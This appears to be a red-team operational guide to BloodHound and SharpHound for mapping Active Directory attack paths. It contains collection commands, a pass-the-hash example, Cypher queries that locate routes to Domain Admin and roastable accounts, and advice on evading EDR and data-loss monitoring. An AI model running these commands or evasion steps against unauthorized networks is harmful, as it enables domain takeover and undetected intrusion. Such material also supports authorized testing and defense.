# BloodHound Operational Guide

> **MITRE ATT&CK**: Discovery > T1087 - Account Discovery (enabling tool)
> **Platforms**: Windows, Linux (collector), Neo4j backend
> **Required Privileges**: User (domain-authenticated)
> **OPSEC Risk**: Low (DCOnly) to Medium (full collection with session enumeration)

## Strategic Overview

BloodHound transforms Active Directory enumeration from guesswork into graph-theory-based attack path analysis. As a Red Team Lead, BloodHound is not optional -- it is the primary tool for identifying privilege escalation paths, understanding delegation abuse, and prioritizing targets. The difference between a junior and senior operator is not running SharpHound but knowing which Cypher queries to write and how to interpret results in the context of the engagement objectives.

**Operational philosophy**: Collect once (stealthily), analyze offline extensively, then execute targeted attacks. Never run SharpHound repeatedly when you can do it right the first time.

## Technical Deep-Dive

### Collection Methods

```powershell
# SharpHound.exe -- Primary Windows collector
# Full collection (most data, most noise)
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# DCOnly -- LDAP only, no session/local admin enumeration (stealth)
.\SharpHound.exe -c DCOnly --zipfilename dc_data.zip

# Granular collection methods
.\SharpHound.exe -c Group,ACL,Trust         # Group memberships, ACLs, trusts
.\SharpHound.exe -c Session --loop          # Session collection on loop (find where admins are logged in)
.\SharpHound.exe -c ObjectProps,SPNTargets  # Object properties + Kerberoastable accounts
.\SharpHound.exe -c All --domain child.corp.local  # Target specific domain in forest

# Exclude domain controllers from session enum (reduce noise)
.\SharpHound.exe -c All --excludedcs
```

```bash
# BloodHound.py -- Remote collection from Linux (no artifact on target hosts)
bloodhound-python -d corp.local -u 'jsmith' -p 'Password1' -ns 10.10.10.1 -c All
bloodhound-python -d corp.local -u 'jsmith' -p 'Password1' -ns 10.10.10.1 -c DCOnly
# Uses LDAP/DNS from attacker box -- zero host artifacts on domain-joined machines

# With NTLM hash (pass-the-hash)
bloodhound-python -d corp.local -u 'jsmith' --hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f -ns 10.10.10.1 -c All
```

### Collection OPSEC Comparison

| Method | LDAP Queries | SMB/RPC | Session Enum | Host Artifacts | Risk Level |
|--------|-------------|---------|--------------|---------------|------------|
| `-c DCOnly` | Yes (DC only) | No | No | Process on collector host | Low |
| `-c Group,ACL,Trust` | Yes | No | No | Process on collector host | Low |
| `-c Session` | Minimal | Yes (NetSessionEnum) | Yes | Touches every target host | Medium-High |
| `-c All` | Yes | Yes | Yes | Full enum of all hosts | Medium-High |
| `bloodhound-python` | Yes | Optional | Optional | None on domain hosts | Low |

### Custom Cypher Queries (Practical Offense)

```cypher
// 1. Find all Domain Admins (direct and nested)
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ '.*DOMAIN ADMINS.*'
RETURN u.name, g.name

// 2. Shortest path from owned principals to Domain Admins
MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

// 3. Where are high-value users logged in (session targeting)
MATCH (c:Computer)-[:HasSession]->(u:User)
WHERE u.admincount = true
RETURN c.name AS Computer, u.name AS AdminUser

// 4. Kerberoastable users with paths to Domain Admins
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u.name, u.serviceprincipalnames

// 5. Users with DCSync rights
MATCH (u)-[:MemberOf*0..]->(g:Group)-[r:GetChanges|GetChangesAll]->(d:Domain)
RETURN u.name, type(r), d.name

// 6. Computers with Unconstrained Delegation (exclude DCs)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS 'DC'
RETURN c.name, c.operatingsystem

// 7. AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.description

// 8. Users with GenericAll over other users
MATCH (u1:User)-[r:GenericAll]->(u2:User)
RETURN u1.name AS Attacker, u2.name AS Target

// 9. GPO abuse paths -- who can modify GPOs linked to privileged OUs
MATCH (u)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO)
RETURN u.name, g.name, type(r)

// 10. Shortest path from owned to any high-value target
MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true}))
WHERE u <> t
RETURN p

// 11. Find computers where Domain Users have local admin
MATCH (g:Group {name:'DOMAIN USERS@CORP.LOCAL'})-[:AdminTo]->(c:Computer)
RETURN c.name

// 12. Foreign group memberships across trusts
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE u.domain <> g.domain
RETURN u.name, u.domain, g.name, g.domain
```

### Attack Path Analysis Methodology

1. **Mark owned principals** -- right-click users/computers you have compromised, mark as "Owned"
2. **Mark high-value targets** -- ensure Domain Admins, DCs, Tier-0 assets are flagged
3. **Run shortest path queries** -- find the minimum-step attack path from owned to targets
4. **Evaluate each edge** -- assess OPSEC cost of each hop (GenericAll is quiet, HasSession requires lateral movement)
5. **Identify alternative paths** -- if primary path is high-risk, find alternatives
6. **Layer in Session data** -- re-collect sessions periodically to find admin sessions on compromised hosts

### AzureHound (Cloud Attack Paths)

```powershell
# Collect Azure AD data
Import-Module .\AzureHound.ps1
Invoke-AzureHound -OutputDirectory C:\Temp\azurehound

# AzureHound CLI (newer version)
.\azurehound.exe -u jsmith@corp.onmicrosoft.com -p 'Password1' list --tenant corp.onmicrosoft.com -o azurehound.json
```

### Neo4j Database Management

```bash
# Clear database between engagements
MATCH (n) DETACH DELETE n

# Import multiple datasets (merge data from different collection runs)
# Simply upload additional ZIP files through the BloodHound GUI -- data merges automatically

# Backup Neo4j database
neo4j-admin dump --database=neo4j --to=backup.dump
```

## Detection & Evasion

| Indicator | Detection Method | Mitigation |
|-----------|-----------------|------------|
| LDAP query volume spike | LDAP telemetry on DCs, event 1644 | Collect during business hours, use DCOnly |
| NetSessionEnum calls | RPC monitoring, event 5145 on file servers | Avoid `-c Session` unless necessary |
| SharpHound process | EDR process monitoring, AMSI | In-memory execution, BOF version |
| Large data exfil (ZIP) | DLP, file size monitoring | Encrypt and stage before retrieval |

**OPSEC best practice**: Run `bloodhound-python` from your Linux attack box for initial collection. Only use SharpHound on-target when you need session data or when Python collection is insufficient. Never run SharpHound from a user workstation with full EDR -- prefer a compromised server with less monitoring.

## Cross-References

- [AD Enumeration](./ad-enumeration.md)
- [Domain Trust Mapping](./domain-trust-mapping.md)
- [Lateral Movement Strategies](../07-lateral-movement/)
- [Active Directory Deep Dive](../12-active-directory-deep-dive/)

## References

- BloodHound Documentation: https://bloodhound.readthedocs.io/
- BloodHound GitHub: https://github.com/BloodHoundAD/BloodHound
- Custom Cypher Queries: https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- BloodHound.py: https://github.com/dirkjanm/BloodHound.py
